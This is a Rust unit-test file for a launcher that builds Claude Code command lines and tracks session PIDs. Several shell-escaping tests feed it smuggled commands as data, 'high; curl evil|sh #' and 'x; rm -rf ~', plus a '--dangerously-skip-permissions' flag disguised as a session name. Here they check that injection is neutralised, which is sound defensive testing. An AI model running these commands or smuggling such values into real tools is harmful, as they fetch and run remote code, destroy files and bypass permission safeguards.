//! Unit tests for `launch/mod.rs`.

use super::*;
use crate::models::session::SessionType;

/// Write a PID-tracking entry for `session` as the spawn path would.
///
/// Re-exported from `launch` (see `mod.rs`), because sibling test modules
/// across the crate need a session that liveness checks can actually resolve.
pub(crate) fn write_test_pid_identity(
    work_dir: &std::path::Path,
    session: &Session,
    pid: u32,
) -> anyhow::Result<()> {
    let (_, pid_key) = tracking_and_pid_key(session)
        .ok_or_else(|| anyhow::anyhow!("test session has no process tracking key"))?;
    let identity = crate::process::ProcessIdentity {
        pid,
        start_time: crate::process::process_start_time(pid),
    };
    pid_tracking::write_pid_entry(work_dir, &pid_key, identity)?;
    let path = pid_tracking::pid_file_path(work_dir, &pid_key);
    let start = identity
        .start_time
        .map(|value| value.to_string())
        .unwrap_or_default();
    std::fs::write(
        path,
        format!("{pid}\n{start}\nloom-owner:{}\n", session.tracking_key),
    )?;
    Ok(())
}

#[test]
fn tracking_and_pid_key_for_stage_session() {
    let mut session = Session::new();
    session.assign_to_stage("worker-pool".to_string());
    let (title, pid_key) = tracking_and_pid_key(&session).unwrap();
    assert_eq!(title, "loom-v2-stage-worker-pool");
    // PID-file key is per-session: tracking_key + session.id (O-14).
    assert_eq!(pid_key, format!("loom-v2-stage-worker-pool-{}", session.id));
}

#[test]
fn tracking_and_pid_key_for_merge_session() {
    let mut session = Session::new_merge("loom/feature".to_string(), "main".to_string());
    session.assign_to_stage("feature".to_string());
    let (title, pid_key) = tracking_and_pid_key(&session).unwrap();
    assert_eq!(title, "loom-v2-merge-feature");
    assert_eq!(pid_key, format!("loom-v2-merge-feature-{}", session.id));
}

#[test]
fn tracking_and_pid_key_for_knowledge_session() {
    let session = Session::new_knowledge("kb");
    let (title, pid_key) = tracking_and_pid_key(&session).unwrap();
    assert_eq!(title, "loom-v2-knowledge-kb");
    assert_eq!(pid_key, format!("loom-v2-knowledge-kb-{}", session.id));
}

#[test]
fn tracking_and_pid_key_for_base_conflict_session() {
    let mut session = Session::new();
    session.session_type = SessionType::BaseConflict;
    session.merge_target_branch = Some("loom/_base/feature".to_string());
    session.assign_to_stage("feature".to_string());
    let (title, pid_key) = tracking_and_pid_key(&session).unwrap();
    assert_eq!(title, "loom-v2-base_conflict-feature");
    assert_eq!(
        pid_key,
        format!("loom-v2-base_conflict-feature-{}", session.id)
    );
}

#[test]
fn tracking_and_pid_key_legacy_fallback() {
    // Legacy session: empty tracking_key, falls back to the bare stage id.
    let mut session = Session::new();
    session.stage_id = Some("legacy".to_string());
    session.tracking_key = String::new();
    let (title, pid_key) = tracking_and_pid_key(&session).unwrap();
    assert_eq!(title, "loom-legacy");
    assert_eq!(pid_key, format!("loom-legacy-{}", session.id));
}

#[test]
fn tracking_and_pid_key_none_without_stage() {
    // No tracking_key and no stage_id → nothing to resolve.
    let session = Session::new();
    assert!(tracking_and_pid_key(&session).is_none());
}

#[test]
fn pid_key_distinct_per_session_for_same_stage() {
    // O-14(a): two consecutive sessions for the SAME stage must get
    // distinct PID-file keys, or liveness for the old session would read
    // the new session's PID.
    let mut s1 = Session::new();
    s1.assign_to_stage("auth".to_string());
    let mut s2 = Session::new();
    s2.assign_to_stage("auth".to_string());

    let (title1, key1) = tracking_and_pid_key(&s1).unwrap();
    let (title2, key2) = tracking_and_pid_key(&s2).unwrap();
    assert_eq!(title1, title2, "tmux keeps the friendly stage title");
    assert_ne!(key1, key2, "different session → different PID-file key");
}

#[test]
fn prefix_sharing_stage_ids_get_distinct_titles() {
    // Stage ids sharing a prefix keep distinct tracking keys.
    let mut auth = Session::new();
    auth.assign_to_stage("auth".to_string());
    let mut auth_tests = Session::new();
    auth_tests.assign_to_stage("auth-tests".to_string());

    let (auth_title, _) = tracking_and_pid_key(&auth).unwrap();
    let (auth_tests_title, _) = tracking_and_pid_key(&auth_tests).unwrap();
    assert_eq!(auth_title, "loom-v2-stage-auth");
    assert_eq!(auth_tests_title, "loom-v2-stage-auth-tests");
    assert_ne!(auth_title, auth_tests_title);
}

#[test]
fn build_claude_command_omits_remote_control_when_disabled() {
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "opus",
        "xhigh",
        "auto",
        &SessionCapsule::default(),
        &RemoteControlInvocation::Disabled,
        "'prompt'",
    );
    assert_eq!(
        cmd,
        "/usr/bin/claude --model opus --effort xhigh --permission-mode auto 'prompt'"
    );
    assert!(!cmd.contains("--remote-control"));
}

#[test]
fn build_claude_command_appends_bare_remote_control_when_enabled() {
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high",
        "auto",
        &SessionCapsule::default(),
        &RemoteControlInvocation::Bare,
        "'prompt'",
    );
    // `sonnet`/`high`/`auto`/`/usr/bin/claude` contain only shell-safe
    // chars, so escaping leaves them unquoted.
    assert_eq!(
        cmd,
        "/usr/bin/claude --model sonnet --effort high --permission-mode auto 'prompt' --remote-control"
    );
    // The flag must sit AFTER the prompt positional, otherwise
    // `--remote-control [name]` swallows the prompt as its optional arg.
    let rc_idx = cmd.find("--remote-control").unwrap();
    let prompt_idx = cmd.find("'prompt'").unwrap();
    assert!(prompt_idx < rc_idx);
}

#[test]
fn build_claude_command_passes_permission_mode_before_prompt() {
    // The resolved permission mode is passed on the CLI (not left to
    // settings.local.json, which Claude Code ignores for `auto`). Like the
    // other option flags it must precede the positional prompt.
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "opus",
        "xhigh",
        "acceptEdits",
        &SessionCapsule::default(),
        &RemoteControlInvocation::Disabled,
        "'prompt'",
    );
    assert!(cmd.contains("--permission-mode acceptEdits"));
    let mode_idx = cmd.find("--permission-mode").unwrap();
    let prompt_idx = cmd.find("'prompt'").unwrap();
    assert!(
        mode_idx < prompt_idx,
        "--permission-mode must precede the prompt positional"
    );
}

#[test]
fn build_claude_command_escapes_effort_injection() {
    // S-3: a tampered reasoning effort must be neutralized, not interpolated
    // raw into the exec'd command line.
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high; curl evil|sh #",
        "auto",
        &SessionCapsule::default(),
        &RemoteControlInvocation::Disabled,
        "'prompt'",
    );
    // The whole effort token is single-quoted, so no `;`/`|`/`#` is active.
    assert!(cmd.contains("--effort 'high; curl evil|sh #'"));
    assert!(!cmd.contains("--effort high; curl"));
}

#[test]
fn build_claude_command_escapes_claude_path_with_spaces() {
    // S-3: a claude path containing spaces must be quoted so the wrapper's
    // `exec` doesn't split it into multiple words.
    let cmd = build_claude_command(
        "/opt/My Tools/claude",
        "sonnet",
        "high",
        "auto",
        &SessionCapsule::default(),
        &RemoteControlInvocation::Disabled,
        "'prompt'",
    );
    assert!(cmd.starts_with("'/opt/My Tools/claude' --model sonnet"));
}

#[test]
fn build_claude_command_appends_named_remote_control_after_prompt() {
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high",
        "auto",
        &SessionCapsule::default(),
        &RemoteControlInvocation::Named("My Stage".to_string()),
        "'prompt'",
    );
    // The `=` joins the name to the flag as a single CLI token.
    assert!(cmd.ends_with("--remote-control='My Stage'"), "cmd: {cmd}");
    // Same ordering constraint as the bare flag: the optional [name] arg
    // would otherwise swallow the prompt positional.
    let rc_idx = cmd.find("--remote-control").unwrap();
    let prompt_idx = cmd.find("'prompt'").unwrap();
    assert!(prompt_idx < rc_idx);
}

#[test]
fn build_claude_command_named_remote_control_rejects_leading_dash_reparsing() {
    // A name starting with `-` must not be re-parseable as a separate CLI
    // flag: `shell_escape` treats `-` as shell-safe and passes it through
    // unquoted, so the `=` join (not shell quoting) is what prevents claude's
    // own optional-argument parser from treating this as a new option.
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high",
        "auto",
        &SessionCapsule::default(),
        &RemoteControlInvocation::Named("--dangerously-skip-permissions".to_string()),
        "'prompt'",
    );
    assert!(
        cmd.contains("--remote-control=--dangerously-skip-permissions"),
        "the whole name must be bound to --remote-control via '=' as one token: {cmd}"
    );
    // There must be no SPACE-separated occurrence of the bare flag name,
    // which is what an optional-argument parser would treat as a new option.
    assert!(!cmd.contains("--remote-control --dangerously-skip-permissions"));
}

#[test]
fn build_claude_command_escapes_named_remote_control_injection() {
    // S-3: a stage name from plan YAML must be neutralized, not
    // interpolated raw into the exec'd command line.
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high",
        "auto",
        &SessionCapsule::default(),
        &RemoteControlInvocation::Named("x; rm -rf ~".to_string()),
        "'prompt'",
    );
    // The whole name is single-quoted, so no `;`/`~` is active.
    assert!(cmd.contains("--remote-control='x; rm -rf ~'"), "cmd: {cmd}");
    assert!(!cmd.contains("--remote-control x; rm"));
}
